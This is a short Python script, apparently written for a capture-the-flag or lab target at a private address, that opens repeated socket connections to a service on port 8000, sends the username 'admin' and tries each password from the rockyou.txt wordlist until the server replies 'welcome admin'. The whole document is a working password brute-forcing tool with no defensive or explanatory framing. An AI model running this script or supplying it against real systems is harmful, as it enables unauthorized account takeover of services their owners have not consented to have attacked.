import socket

# Define the target IP and port
target_ip = '10.10.200.22'
target_port = 8000

# Load your wordlist of passwords
with open('/usr/share/wordlists/rockyou.txt', 'rb') as f:
    passwords = f.readlines()

for password in passwords:
    password = password.strip()  # Remove newline characters
    try:
        password = password.decode('utf-8', errors='ignore')
    except UnicodeDecodeError:
        continue  # Skip any problematic password that cannot be decoded

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    # Send the 'admin' username
    s.send(b"admin\n") # The \n represents the "enter" button.
    response = s.recv(1024).decode()

    if "password" in response.lower():
        print(f"Trying password: {password}")
        s.send(password.encode() + b"\n")
        
        # Read the response from the server after the password attempt
        response = s.recv(1024).decode()

        # Check if the password is correct
        if "welcome admin" in response.lower():
            print(f"Success! Password is: {password}")
            break
        else:
            print(f"Password {password} is incorrect.")
    else:
        print("No password prompt received.")
    
    s.close()
